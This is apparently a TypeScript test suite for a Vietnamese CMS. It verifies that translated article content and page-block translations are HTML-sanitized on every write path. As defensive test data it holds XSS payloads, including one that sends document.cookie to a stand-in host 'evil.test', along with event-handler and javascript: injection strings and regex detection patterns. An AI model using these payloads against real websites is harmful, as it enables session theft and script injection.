import assert from 'node:assert/strict'
import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import test from 'node:test'
import { sanitizeBlockData, sanitizeHtml } from '../server/utils/sanitize-html'
import { sanitizeTranslationFields, stripMarkup } from '../server/utils/translation-html'

/**
 * Bản dịch được hiển thị bằng `v-html` y như bài gốc, nhưng trước đây bài gốc
 * được lọc lúc ghi còn bản dịch thì không — ở bài viết (`article_translations`,
 * cả sửa tay lẫn AI dịch) và ở khối trang (`data.translations[lang]`, mà lớp lọc
 * khối chỉ nhìn cấp ngoài). Các test này giữ cả ba đường đã đóng, và chặn một đường
 * ghi mới bỏ sót. Lọc lúc ĐỌC ở hai endpoint công khai (`articles/[slug]`,
 * `pages/[slug]`) được kiểm bằng cách chạy handler thật trên hàng độc hại đã lưu:
 * `tests/public-translation-sanitize-behavior.test.ts`.
 */

const read = (path: string) => readFileSync(new URL(path, import.meta.url), 'utf8')

const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
const EVENT_HANDLER = /\son[a-z]+\s*=/i
const DANGEROUS_SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
const neutralised = (html: string) => !EXECUTABLE.test(html) && !EVENT_HANDLER.test(html) && !DANGEROUS_SCHEME.test(html)

const PAYLOADS = [
  '<p>Xin chào</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
  '<img src=x onerror="alert(document.domain)">',
  '<a href="javascript:alert(1)">bấm vào đây</a>',
  '<svg onload=alert(1)><script>alert(2)</script></svg>',
  '<p onclick="alert(1)">đoạn</p>',
]

// ─── Bài viết: nội dung bản dịch ─────────────────────────────────────────────

test('translation content is neutralised and the rest of the update is untouched', () => {
  for (const payload of PAYLOADS) {
    const out = sanitizeTranslationFields({ status: 'published', progress: 100, content: payload })
    assert.ok(neutralised(out.content), `leaked: ${payload} -> ${out.content}`)
    assert.equal(out.status, 'published')
    assert.equal(out.progress, 100)
  }
})

test('legitimate translated markup survives', () => {
  const html = '<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong> và <a href="https://example.gov.vn" target="_blank">liên kết</a>.</p><ul><li>Một</li></ul>'
  const out = sanitizeTranslationFields({ content: html }).content
  assert.match(out, /<h2>Tiêu đề<\/h2>/)
  assert.match(out, /<strong>đậm<\/strong>/)
  assert.match(out, /href="https:\/\/example\.gov\.vn"/)
  assert.match(out, /rel="noopener noreferrer"/, 'a new-tab link must not hand the page to the target')
})

test('an update without content passes through, and null stays null', () => {
  const noContent = { status: 'failed', errorMessage: 'x' }
  assert.equal(sanitizeTranslationFields(noContent), noContent)
  assert.equal(sanitizeTranslationFields({ content: null }).content, null)
})

// Hai tệp cùng giữ các đường ghi `article_translations.content`: `article-translations.ts`
// (sửa tay) và `article-translation-worker.ts` (job dịch AI, tách ra khỏi tệp trên).
const TRANSLATION_WRITERS = ['article-translations.ts', 'article-translation-worker.ts']

test('every write of translation content is sanitized', () => {
  let found = 0
  for (const name of TRANSLATION_WRITERS) {
    const lines = read(`../server/services/${name}`).split('\n')
    const writes = lines
      .map((text, index) => ({ text, line: index + 1 }))
      // a `content:` value or a `.content =` assignment, but not a type member
      .filter(({ text }) => (/^\s*content:\s+\S/.test(text) && !/content:\s*string/.test(text)) || /\.content\s*=[^=]/.test(text))
    found += writes.length
    for (const { text, line } of writes) {
      assert.match(text, /sanitizeHtml\(/, `${name}:${line} writes content without sanitizing: ${text.trim()}`)
    }
  }
  assert.ok(found >= 3, 'the writes this guard exists for must be found')
  // The generic updater also carries `content` (the partial save after a failed chunk).
  assert.match(read('../server/services/article-translation-worker.ts'), /\.set\(sanitizeTranslationFields\(updates\)\)/)
})

test('no other server file writes article translation content', () => {
  const offenders: string[] = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name)
      if (entry.isDirectory()) { walk(path); continue }
      if (!/\.(ts|mjs)$/.test(entry.name) || TRANSLATION_WRITERS.some(name => path.endsWith(name))) continue
      // Ngoại lệ có tên: chính lượt dọn một lần ghi lại `content` đã qua sanitizeHtml
      // (kiểm ngay bên dưới), nên nó không phải đường ghi chưa lọc.
      if (path.endsWith('stored-html-sanitize.ts')) continue
      const text = readFileSync(path, 'utf8')
      if (/(insert|update)\(articleTranslations\)/.test(text) && /\bcontent\b/.test(text.slice(text.search(/(insert|update)\(articleTranslations\)/)))) {
        offenders.push(path)
      }
    }
  }
  walk(new URL('../server', import.meta.url).pathname)
  assert.deepEqual(offenders, [], 'route the write through sanitizeTranslationFields and add it to the guard above')
})

test('the one-off cleanup writes only content that went through sanitizeHtml', () => {
  const source = read('../server/services/stored-html-sanitize.ts')
  assert.match(source, /sanitizeHtml\(row\.content\)/)
  assert.match(source, /set\(\{ content: fix\.content \}\)/, 'it writes the planned (sanitized) content and nothing else')
})

// ─── Khối trang: bản dịch lồng trong data.translations ───────────────────────

test('block translations are sanitized, not only the top-level fields', () => {
  const data = sanitizeBlockData({
    html: '<p>gốc</p>',
    title: 'giữ nguyên',
    translations: {
      en: { html: PAYLOADS[0], bodyHtml: PAYLOADS[1], title: 'Plain <b>title</b>' },
      zh: { content: PAYLOADS[2] },
      fr: 'not an object',
    },
  }) as Record<string, unknown>
  const translations = data.translations as Record<string, Record<string, string> | string>
  assert.ok(neutralised((translations.en as Record<string, string>).html!))
  assert.ok(neutralised((translations.en as Record<string, string>).bodyHtml!))
  assert.ok(neutralised((translations.zh as Record<string, string>).content!))
  assert.equal((translations.en as Record<string, string>).title, 'Plain <b>title</b>', 'plain-text fields are not rewritten')
  assert.equal(translations.fr, 'not an object')
  assert.equal(data.title, 'giữ nguyên')
})

test('a hostile translations value cannot break the sanitizer', () => {
  for (const bad of [null, 'x', 7, [1, 2], { en: null }, { en: [PAYLOADS[0]] }]) {
    assert.doesNotThrow(() => sanitizeBlockData({ html: '<p>ok</p>', translations: bad }))
  }
  assert.deepEqual(sanitizeBlockData({ translations: [1] }).translations, [1])
})

test('sanitizeHtml itself still drops every payload used above', () => {
  for (const payload of PAYLOADS) assert.ok(neutralised(sanitizeHtml(payload)), payload)
})

test('title và excerpt là văn bản thuần: thẻ HTML bị gỡ, dấu < thường giữ nguyên', () => {
  assert.equal(stripMarkup('Tiêu đề <script>alert(1)</script>'), 'Tiêu đề alert(1)')
  assert.equal(stripMarkup('<b>đậm</b> và <img src=x onerror=alert(1)>'), 'đậm và ')
  assert.equal(stripMarkup('<!-- ghi chú -->xin chào'), 'xin chào')
  // thẻ lồng nhau không tái tạo thành thẻ sau một lượt gỡ: kết quả không còn dấu `<` nào
  assert.ok(!stripMarkup('<scr<script>ipt>alert(1)</scr</script>ipt>').includes('<'))
  assert.ok(!stripMarkup('<<script>script>alert(1)<</script>/script>').match(/<\/?script/i))
  // dấu so sánh / toán học không phải thẻ
  assert.equal(stripMarkup('Dưới 5 < 10 tuổi, 3 <3 mẹ, a<b'), 'Dưới 5 < 10 tuổi, 3 <3 mẹ, a<b')
  assert.equal(stripMarkup('Không có gì'), 'Không có gì')

  const out = sanitizeTranslationFields({ title: 'T <script>x</script>', excerpt: 'E <b>y</b>', content: '<p>ok</p><script>z</script>', status: 'x' })
  assert.equal(out.title, 'T x')
  assert.equal(out.excerpt, 'E y')
  assert.ok(!/<script/i.test(out.content ?? ''))
  assert.equal((out as { status: string }).status, 'x')
  // không có trường nào cần lọc → trả đúng đối tượng cũ
  const plain = { status: 'failed' }
  assert.equal(sanitizeTranslationFields(plain), plain)
  assert.equal(sanitizeTranslationFields({ title: null }).title, null)
})

test('đường sửa tay cũng gỡ thẻ khỏi title/excerpt', () => {
  const source = read('../server/services/article-translations.ts')
  // Entities are decoded first (`decodePlainTextInput`), THEN tags are stripped, so `&lt;b&gt;` cannot survive as `<b>`.
  assert.match(source, /updates\.title = stripMarkup\(decodePlainTextInput\(data\.title\)/)
  assert.match(source, /updates\.excerpt = stripMarkup\(decodePlainTextInput\(data\.excerpt\)/)
})

test('bản dịch: entity được giải mã TRƯỚC khi gỡ thẻ — `&lt;b&gt;` không sống sót thành `<b>`', () => {
  const out = sanitizeTranslationFields({ title: 'Ng&agrave;y &lt;b&gt;x&lt;/b&gt;', excerpt: 'C&Ocirc;NG &lt;script&gt;alert(1)&lt;/script&gt; t&aacute;c' })
  assert.equal(out.title, 'Ngày x')
  assert.ok(!out.excerpt!.includes('<'), out.excerpt!)
  assert.match(out.excerpt!, /^CÔNG .*tác$/)
})
